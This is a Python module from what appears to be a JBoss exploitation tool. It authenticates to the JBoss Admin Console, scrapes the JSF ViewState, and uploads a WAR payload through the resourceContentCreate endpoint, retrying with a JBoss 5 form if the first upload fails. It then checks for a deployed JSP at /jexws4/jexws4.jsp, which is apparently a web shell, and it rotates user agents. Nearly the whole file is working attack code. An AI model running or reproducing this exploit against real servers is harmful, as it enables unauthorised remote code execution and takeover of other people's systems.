from time import sleep

from src.exploits.ex1 import url_encode, get_boundary_admin_console, get_successfully
from src.payloads.payloads__exploit_admin_console import payloads__exploit_admin_console
from src.utils.colors import Colors
from src.utils.misc import get_viewstate_value, print_and_flush, get_random_user_agent


def exploit_admin_console(url: str, jboss_login: str) -> int:
    """
    Authenticates to JBoss Admin Console and deploys a WAR via the console, returns deployment status.
    """
    username, password = jboss_login.split(":", 1)
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
    }
    # Initial login GET
    r = gl_http_pool.request("GET", f"{url}/admin-console/login.seam", headers=headers)
    cookie = r.getheader("set-cookie")
    if cookie:
        headers["Cookie"] = cookie
    state = get_viewstate_value(str(r.data))
    if state is None:
        return 505

    payload = (
        f"login_form=login_form&login_form%3Aname={username}"
        f"&login_form%3Apassword={password}&login_form%3Asubmit=Login"
        f"&javax.faces.ViewState={url_encode(state)}"
    )
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    print_and_flush(
        Colors.GREEN
        + f"\n * Info: Trying authentication with credentials: {jboss_login}"
        + Colors.ENDC
    )
    r = gl_http_pool.request("POST", f"{url}/admin-console/login.seam",
                             body=payload, headers=headers, redirect=False)
    if r.status != 302:
        print_and_flush(
            Colors.RED
            + f"\n * Failed authentication with credentials: {jboss_login}.\n"
              "   Please try again with different credentials!\n"
            + Colors.ENDC
        )
        sleep(4)
        return 404

    # Follow redirect and deploy WAR
    location = r.getheader("Location")
    r = gl_http_pool.request("GET", location, headers=headers)
    state = get_viewstate_value(str(r.data)) or (sleep(7) or get_viewstate_value(str(r.data)))
    headers["Content-Type"] = "multipart/form-data; boundary=---------------------------551367293438156646377323759"
    war_payload = payloads__exploit_admin_console
    data = get_boundary_admin_console(jboss_version=6, state=state, payload=war_payload)
    try:
        r = gl_http_pool.request(
            "POST",
            f"{url}/admin-console/secure/resourceContentCreate.seam",
            headers=headers,
            body=data
        )
        if r.status != 302:
            data = get_boundary_admin_console(jboss_version=5, state=state, payload=war_payload)
            r = gl_http_pool.request(
                "POST",
                f"{url}/admin-console/secure/resourceContentCreate.seam",
                headers=headers,
                body=data
            )
    except:
        sleep(1)

    return get_successfully(url, "/jexws4/jexws4.jsp")
